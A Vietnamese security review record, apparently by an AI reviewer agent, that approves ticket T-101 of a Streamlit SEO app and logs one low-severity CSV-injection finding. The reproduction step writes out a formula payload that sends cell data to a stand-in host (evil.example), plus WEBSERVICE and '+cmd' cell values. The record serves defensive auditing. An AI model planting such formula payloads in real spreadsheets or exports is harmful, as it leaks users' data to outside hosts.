# Biên bản bảo mật T-101 · Trang Kế hoạch, Cài đặt → Google, trang Bài viết

> **Model:** chạy tạm Claude Opus 5.5, cần kiểm lại bằng Claude Fable sau 01/11 (tài khoản chưa dùng được Fable; chủ dự án đã duyệt).

| Mục | Nội dung |
|---|---|
| Người kiểm định | Lá Chắn (`la-chan`) · model: Claude Opus 5.5 (tạm, xem trên) · dưới Chỉ Huy B |
| Phiếu được kiểm | [T-101](../tickets/T-101-giao-dien-ke-hoach-cai-dat-google.md) (Họa Sĩ `6b0c785`, Soi Lỗi `164c58a`, gốc `main` `fd28bbc`) · điều kiện [Lá Chắn T-094](T-094-la-chan.md): chung LC-T094-1, -2, -3; riêng LC-T094-32 → -35; liên quan LC-T094-12, -15, -21, -28. Điều kiện mang sang T-101 ở biên bản [T-098](T-098-la-chan.md) (1, 3), [T-100](T-100-la-chan.md) (lượt 1 đk 5; lượt 3–4 đk (a) và bảng «T-101, T-102 nối giao diện được chưa»), T-097 (đk 3: không giữ client Google trong phiên) |
| Phạm vi | **Rút gọn**. Diff `fd28bbc..164c58a`: `app/views/plan.py` (+914), `app/views/settings.py` (+224, tab «📗 Google»), `app/views/home.py` (+270), `seo_app/demo.py` (−72 phần demo kế hoạch); test `test_t101_plan_page.py`, `test_t101_settings_google.py`, `test_t101_home_page.py`, `test_soi_loi_t101.py`; R5: một test `test_app_pages.py` (Chỉ Huy duyệt). Đọc thêm: `seo_app/text.py` (`escape_markdown`), `seo_app/plan/sync.py` (đường ghi), `WordPressClient.post_statuses` (bản trên `main`), mã giao diện bảng của Streamlit 1.65 (`streamlit/static/static/js/DataFrame.*.js`, phần «Tải về CSV»). Không đổi `seo_app/plan`, `seo_app/google`, `seo_app/storage`, `seo_app/wordpress`, `config/` |
| Ngày | 2026-10-30 (19:29–19:46 +07, giờ máy) |
| **Kết luận** | **ĐẠT CÓ ĐIỀU KIỆN**: 0 Nghiêm trọng, 0 Cao, 0 Trung bình, **1 Thấp** (LC-T101-1: bảng trên trang tải về CSV được, ô dạng công thức không được trung hòa). Mọi điều kiện LC-T094 của phiếu và các điều kiện tôi ghi cho T-101 ở biên bản trước đều đạt. **Không lỗi nào bắt buộc sửa trước khi gộp**. Tự đọc Sheet khi bản lưu cũ hơn 5 phút: **chấp nhận được**. Gộp `main` được: với `main` trên máy `17b2a31` không xung đột, 12 file test chọn lọc qua trên cây gộp, 0 hỏng |

## Tóm tắt (cho chủ dự án)

Trang Kế hoạch, tab Google trong Cài đặt và trang Bài viết **an toàn để gộp**:
- Mọi chữ lấy từ Google Sheet, file, chữ dán, AI hiện đúng là chữ: link không bấm được, không đậm/màu/thẻ HTML lạ, ký tự đảo chiều bị bỏ.
- App không in đầy đủ mã Sheet (chỉ 4 ký tự cuối), không in đường dẫn hay nội dung file khóa; chỉ hiện tên file và email tài khoản dịch vụ (cần để chia sẻ Sheet).
- Chỉ ghi lên Google Sheet khi anh/chị bấm «Áp dụng», «Thử ghi lại», «Chuẩn bị trang tính», và chỉ qua phần đồng bộ đã kiểm ở T-100. AI chỉ chạy khi bấm, và có báo tốn tiền. «Viết bài» không gửi gì lên website.
- File tải lên được kiểm cỡ (≤ 1 MB), loại, bảng mã trước khi đọc.

Một lỗi nhỏ: bảng trên trang có nút «Tải về CSV» của Streamlit. Nếu chữ trong ô bắt đầu bằng «=» (ai đó gõ vào Sheet, hay AI viết), tải về mở bằng Excel có thể thành công thức. Cần anh/chị bấm tải về, mở bằng Excel, rồi bấm «Bật chỉnh sửa» mới có hại. Nên sửa ở lượt sau, không chặn gộp.

## Lỗi phát hiện

### LC-T101-1 · Bảng tải về CSV: ô dạng công thức không được trung hòa

| Mục | Nội dung |
|---|---|
| Mức | **Thấp** (cần người dùng tự tải bảng về, mở bằng Excel và bật chỉnh sửa; dữ liệu độc phải vào được Sheet, file, chữ dán hay lời AI) |
| Chỗ | `app/views/plan.py`: bảng danh sách bài (`:782`), đề xuất (`:460`), «Xem đủ một đề xuất» (`:435`), xung đột (`:558`) đưa chữ nguyên văn vào `st.dataframe`. Thanh công cụ của bảng Streamlit 1.65 có nút tải về CSV; hàm ghi ô (`O_` trong `streamlit/static/static/js/DataFrame.*.js`) chỉ bọc ngoặc kép ô có dấu phẩy, ngoặc kép, xuống dòng, **không** trung hòa ô mở đầu bằng `=`, `+`, `-`, `@`, tab, CR (đầu file còn có BOM nên Excel mở đúng UTF-8) |
| Tái hiện | `PlanRow` giữ nguyên chữ dạng công thức (đúng thiết kế: đó là chữ). Ô «Từ khóa chính» trên Sheet là `=HYPERLINK("https://evil.example/?q="&A2;"Bấm") cửa sắt`, «Tiêu đề dự kiến» là `=WEBSERVICE(…)`: bảng danh sách bài hiện nguyên hai chuỗi đó. Dán bảng có từ khóa `+cmd cửa kéo đài loan`: bảng đề xuất hiện nguyên. `tests/test_la_chan_t101.py` (2 ca, `xfail(strict=True)`, `--runxfail` hỏng đúng ở `assert formula_cells(table) == []`) |
| Vì sao là rủi ro | CSV injection: Excel chạy `=HYPERLINK`, `=WEBSERVICE` (gửi dữ liệu ô khác ra ngoài). Đây đúng là điều LC-T094-28 chặn khi ghi Sheet (`sync.safe_text`); bảng tải về từ app là đường thứ hai T-101 mở ra |
| Cách sửa gợi ý | Ô chữ đưa vào `st.dataframe` qua `sync.safe_text` (thêm một dấu cách đầu, như khi ghi Sheet), ở cả 4 bảng; chữ hiện bằng `st.text` không cần (không có nút tải về). Gỡ `xfail` khi XPASS (R5) |
| Ai sửa, hạn | Họa Sĩ: lượt sửa nhỏ của T-101, hay cùng T-102 (nhánh T-102 gộp `team/T-101`). Trước lần thử thật Giai đoạn 5 (LC-T094-44) |

## Đối chiếu điều kiện

| Điều kiện | Đạt? | Bằng chứng |
|---|---|---|
| **LC-T094-1** Test không gọi Google, WordPress, AI thật | **Đạt** | `FakeGoogle` + `FakePlanSheet` đi qua `SheetsClient` thật, `FakeWordPress`, AI giả; khóa RSA sinh lúc chạy; cache, kho nháp ở thư mục tạm; bộ chặn mạng `tests/conftest.py` không đổi |
| **LC-T094-2** Câu báo cố định | **Đạt** | Lỗi hiện bằng `str(exc)` của các lớp lỗi câu cố định (`SheetsError`, `ServiceAccountError`, `PlanSourceError`, `AIError`, `WordPressError`, `DraftError`…) hay hằng `MSG_*` của trang; không `print`, `logging`, `st.exception`, `st.write` |
| **LC-T094-3**, **-32** Chữ thuần mọi bảng | **Đạt** (trừ LC-T101-1, chuyện tải về) | Bảng: `st.dataframe`. Chữ dài (ghi chú, tiêu đề dự kiến, từ khóa phụ, lý do AI): `st.text`. Câu báo, chữ trong Markdown: `escape_markdown`, thoát cả `:` và `$` nên cú pháp màu, nhãn, công thức LaTeX của Streamlit không chạy. Nhãn ô tick chỉ có số dòng, loại, mã bài chuẩn hóa (`pick_label`). Trang đích hiện «bài #mã», không link. Tên Sheet từ Google, tên file khóa, email qua `visible()` (ký tự vô hình, đảo hướng thành «�») rồi escape. Test của Họa Sĩ, Soi Lỗi gài `[bấm](javascript:…)`, `<b>`, U+202E, U+200B: hiện thuần |
| **LC-T094-33** Tải file | **Đạt** | Kiểm `upload.size` bằng code **trước** `getvalue()` (`plan.py:262`); `parse.read_file` kiểm lại byte, đuôi (`.csv`, `.tsv`, `.txt`, `.md`; ô tải cũng chỉ nhận các đuôi đó), chỉ UTF-8; không ghi file xuống đĩa. Test: file quá 1 MB bị từ chối khi chưa lấy byte, `.xlsx`, file `.exe` đổi đuôi `.csv` |
| **LC-T094-34** Cài đặt → Google | **Đạt** | «Đã khai báo / chưa», **tên** file khóa (`folder_name_md`), email dịch vụ trong `st.code` (`settings.py:595`), mã Sheet chỉ 4 ký tự cuối (`:605`); không đường dẫn, không nội dung khóa. Link Sheet chỉ lấy mã (`sheet_id_from_link`), không mở link; ghi `.env` qua `env_file.set_google_sheet_id` (bộ kiểm riêng); `GOOGLE_SERVICE_ACCOUNT_FILE` không ghi được từ đây. «Kiểm tra kết nối», «Chuẩn bị trang tính», «Thêm cột còn thiếu», «Áp dụng thay đổi» chỉ chạy khi bấm. «Bỏ» và dòng có cảnh báo không tick sẵn (`value=item.preselected`, `plan.py:472`). Không thêm trang mới; trang cũ vẫn qua cổng đăng nhập |
| **LC-T094-35** Không hẹn giờ, đăng hàng loạt | **Đạt** | «Viết bài» (`plan.py:648`, `home.py:96`): kiểm lại mã bài, tìm nháp theo `client.sheet_hash`, chưa có thì đọc lại đúng dòng (`open_row`), dựng lại qua `PlanRow`, đặt `_open_draft` / `_start_keyword`, `_start_plan_key`, chuyển trang. Không gọi WordPress (test đếm 0 request); dòng «Bỏ», «Cập nhật bài cũ» bị khóa nút |
| LC-T094-12, -15 (phần giao diện) | **Đạt** | Như LC-T094-34; mã Sheet chỉ truyền vào hàm (`get_plan`, `retry_pending`), không hiện ra; client Google tạo mới mỗi lần (`sheets_client`, `google_client`), không giữ trong phiên (đk 3 biên bản T-097) |
| LC-T094-21 / đk 3 biên bản T-098 | **Đạt** | `ai_box` (`plan.py:334`): chữ dán hay từ khóa kế hoạch hiện tại có số điện thoại, email thì «Gửi AI đọc» khóa; «Che rồi gửi» chỉ bật khi số chỉ nằm trong chữ dán; số trong từ khóa thì nêu đúng mã dòng, bảo sửa trên Sheet hay «Vẫn gửi» |
| LC-T094-28 (ghi Sheet) | **Đạt** | Trang chỉ ghi qua `sync.apply_proposals` (`:511`), `sync.retry_pending` (`:743`), `plan_sync.prepare_sheet` (`settings.py:692`); không lệnh `update_cells`, `append_row`, `batch_update` trực tiếp trong `app/`. Chữ ghi lên Sheet qua `safe_text` (T-100) |
| Đk 1 biên bản T-098 (lỗi lạ thành câu cố định) | **Đạt** | Mỗi đường bắt đúng lớp lỗi của lõi và `ValueError` (kể cả `PlanKeyError` «hết mã bài») thành câu cố định `MSG_ODD_DATA`. Lỗi lập trình ngoài dự tính (`TypeError`…) vẫn hiện khung lỗi như mọi trang (Quan sát 2) |
| Đk biên bản T-100 cho T-101 | **Đạt** | (1) Chữ thuần, chữ AI xem đủ: `proposal_detail` (`plan.py:425`) hiện mọi trường bằng bảng và `st.text`, không cắt. (2) `plan_base` (bản đã xem) giữ trong phiên tới «Áp dụng»; đề xuất chỉ từ `compare_rows` / `plan_changes`. (3) `MSG_FULL` (cảnh báo của `SheetPlan`), `ApplyResult` (câu báo gồm cả `notes`), bảng xung đột «trước / bây giờ / đề xuất» (`conflict_rows`, `:527`). (4) Như dòng trên. (5) Như dòng LC-T094-21 |

## Các câu Chỉ Huy hỏi

- **Tự đọc Sheet khi bản lưu cũ hơn 5 phút: chấp nhận được.**
  - Chỉ là lệnh **đọc**, đúng Sheet và tài khoản dịch vụ chủ dự án đã khai báo, đúng thiết kế 2.6.
  - Không AI, không ghi gì; gọi lại trong vòng 5 phút thì dùng bản lưu (Soi Lỗi đếm: 0 lệnh Google, WordPress, AI).
  - Google lỗi thì hiện bản lưu kèm câu báo.
  - Không khai báo Google thì không đọc, không tạo file.
  - Trang Bài viết chỉ đọc bản lưu trên máy, không gọi Google.
- **Gọi mạng khác:**
  - «Đọc kế hoạch và đề xuất cập nhật» có thể tải lại danh sách bài đã đăng (khi bộ nhớ đệm cũ), «Trạng thái trên website» đọc trạng thái bài: cả hai chỉ chạy khi bấm.
  - `post_statuses` (bản trên `main`) nhận tối đa 1.000 mã số nguyên dương, chia lệnh 100 mã; `_fields` là hằng.
  - Link Sheet khác chỉ được **đọc** một lần bằng tài khoản dịch vụ, khi bấm.
- **File tải lên:** cỡ, kiểu, bảng mã như LC-T094-33. Chữ dạng công thức ghi lại Sheet được `safe_text` thêm dấu cách đầu (T-100); riêng đường tải bảng về CSV là LC-T101-1.

## Góp ý của Soi Lỗi

| Góp ý | Ý kiến Lá Chắn |
|---|---|
| G1 (ô «Viết bài mới» gõ tay không bỏ `_start_plan_key` cũ) | Hôm nay vô hại (chưa phiếu nào đọc khóa này). Nhưng khi T-102 đọc khóa để ghi «Đang viết» và trạng thái sau khi gửi, khóa sót lại sẽ gắn bài với **nhầm dòng kế hoạch**, rồi ghi nhầm trạng thái dòng đó. Đồng ý Chỉ Huy giao T-102: điều kiện 2 dưới |
| G2 («Thử ghi lại» không chạy lại trang) | Không phải bảo mật (chỉ hiện trạng thái cũ tới lần bấm sau) |
| G3 (`data/site_index.sqlite` rỗng khi mở trang) | Không phải bảo mật: file trong `data/` (đã bị `.gitignore` chặn), không gọi mạng, không bí mật |

## Danh sách kiểm tra

| Mã | Kết quả | Bằng chứng / ghi chú |
|---|---|---|
| S1 | Đạt | `detect-secrets` (`PYTHONUTF8=1`) trên 11 file đổi, bản vá nhánh, file test mới, kèm file mồi tiếng Việt: mồi bắt 2/2; chỉ mật khẩu thử có từ trước (Báo nhầm). Lịch sử `fd28bbc..164c58a`: 0 dạng khóa thật |
| S2 | Đạt | LC-T094-2 |
| S3 | Đạt | Không biến `.env` mới; `GOOGLE_SHEET_ID` ghi qua bộ kiểm riêng của T-097 |
| W1–W4 | Đạt | Chỉ `post_statuses` (đọc), khi bấm; «Viết bài» không gọi WordPress |
| A1–A3 | Đạt | AI chỉ khi bấm; lời dặn, khung dữ liệu, dò số điện thoại, email của T-098, T-103 |
| U1 | Đạt (trừ LC-T101-1) | LC-T094-3, -32 |
| U2 | Đạt | Không đường dẫn, mã Sheet đầy đủ, nội dung khóa trên giao diện |
| U3 | Đạt | Mọi lệnh ghi, AI, hỏi website chỉ khi bấm; đọc Sheet tự động có hạn 5 phút |
| F1 | Đạt | Không ghi file tải lên xuống đĩa; trang không tạo file nháp, cache khi chưa có |
| F3 | Đạt | LC-T094-33 |
| D1, D2 | Đạt | `pyproject.toml`, `uv.lock`, `.gitignore` không đổi |
| D3 | Đạt | LC-T094-1 |

## Kết quả công cụ quét

Máy chủ dự án, Windows 11, Python 3.12.15, Streamlit 1.65.0, worktree `wt-T-101` tại `164c58a`; máy đang chạy toàn bộ test của Chỉ Huy.

| Công cụ | Kết quả | Đã xác minh |
|---|---|---|
| detect-secrets 1.5.0 | **Đặt `PYTHONUTF8=1`**, `--all-files` trên bản sao 11 file đổi, bản vá nhánh, `tests/test_la_chan_t101.py` và **file mồi tiếng Việt**: mồi bắt **2/2**; file thật: 1 mục (Báo nhầm) | Có. Đã xóa file mồi |
| bandit 1.9.4 | `PYTHONUTF8=1`, `app/views/plan.py`, `settings.py`, `home.py` (1.714 dòng): không có mục nào | Có |
| pip-audit | Không chạy: `uv.lock` không đổi | — |
| Soát lịch sử git | `git log -p fd28bbc..164c58a`: 0 dạng khóa thật, 0 `"type": "service_account"` | Có |
| pytest (nhánh) | `tests/test_la_chan_t101.py`: **2 xfailed**; `--runxfail`: 2 ca hỏng đúng chỗ | Có |
| ruff | `ruff check`, `ruff format --check` file test mới: sạch; cả cây gộp: dưới | Có |
| Thử gộp | `main` trên máy `17b2a31` (có T-107, T-099 lượt 2) + `164c58a`: `git merge-tree --write-tree` **không xung đột** (cây `8a6aa2b`); từ gốc chung `fd28bbc`, hai bên không sửa chung file nào (`main` đổi `seo_app/images/process.py`, `seo_app/wordpress/client.py`). Commit tạm `c6a2072` trong worktree riêng (`git commit-tree`, không nhánh, đã gỡ), thêm `tests/test_la_chan_t101.py`: `ruff` cả cây sạch; 12 file (3 file trang T-101, Soi Lỗi T-101, Lá Chắn T-101, `test_app_pages.py`, client WordPress `test_wordpress_release.py`, `test_soi_loi_t099.py`, `test_la_chan_t099.py`, `test_plan_sync.py`, chữ thuần `test_app_t044_safe_text.py`, `test_soi_loi_t044.py`): **818 passed, 2 xfailed** (đúng 2 ca LC-T101-1), 0 failed, 5 phút 5 giây | Có |

## Quan sát (không tính là lỗi)

1. Ô «Viết bài mới» trên trang Bài viết và nút «Viết bài» cùng dùng khóa phiên `_start_keyword`. Việc T-102 đọc `_start_plan_key` phải ràng với đúng lần bấm (G1, điều kiện 2).
2. `client.showErrorDetails` của Streamlit để mặc định (cả app, có từ trước): lỗi lập trình ngoài dự tính vẫn hiện khung lỗi kèm đường dẫn máy trên chính máy đó. Các đường dữ liệu chưa tin cậy của T-101 đều bắt lỗi thành câu cố định; nếu muốn chắc hơn, có thể đặt `showErrorDetails = "none"` (phiếu riêng, hỏi chủ dự án vì làm khó gỡ lỗi).
3. «Đọc kế hoạch» ở tab «Google Sheets» đọc được bất kỳ Sheet nào đã chia sẻ cho email dịch vụ. Chỉ đọc, chỉ khi người dùng dán link và bấm; kết quả vẫn qua `PlanRow`, đề xuất, duyệt.

## Báo nhầm đã loại

- detect-secrets «Secret Keyword» ở `tests/test_app_pages.py:13` (`PASSWORD = …`): mật khẩu **thử** của test đăng nhập, có từ 06/10 (`git blame`), không do T-101.

## Điều kiện (ĐẠT CÓ ĐIỀU KIỆN)

Không điều kiện nào bắt buộc trước khi gộp T-101 vào `main`.

| # | Điều kiện | Phiếu nhận | Hạn |
|---|---|---|---|
| 1 | **LC-T101-1:** ô chữ đưa vào `st.dataframe` qua `sync.safe_text` (4 bảng của trang Kế hoạch; bảng mới ở T-102 cũng vậy); gỡ 2 `xfail` khi XPASS (R5). Trong lúc chờ: README nhắc không mở bảng tải về từ app bằng Excel khi chưa xem (cùng mục LC-T094-43) | Họa Sĩ (lượt sửa nhỏ T-101 hay cùng T-102); Thư Ký (README) | Trước lần thử thật Giai đoạn 5 (LC-T094-44) |
| 2 | **T-102 (G1):** chỉ dùng `_start_plan_key` khi đi cùng `_start_keyword` của **đúng** lần bấm từ kế hoạch (ví dụ đặt hai khóa thành một cặp, đọc xong bỏ cả hai); đường gõ tay bỏ khóa cũ. Kèm các điều kiện T-102 đã ghi ở biên bản T-100 (lượt 3–4) và T-103 (đk 2) | T-102 | Khi làm T-102 |
| 3 | Kiểm lại biên bản này bằng Claude Fable sau 01/11 | Chỉ Huy | Sau 01/11 |

LC-T101-1 có lượt sửa, không cần chủ dự án chấp nhận rủi ro; không thêm dòng vào sổ rủi ro (`security.md` mục 6).
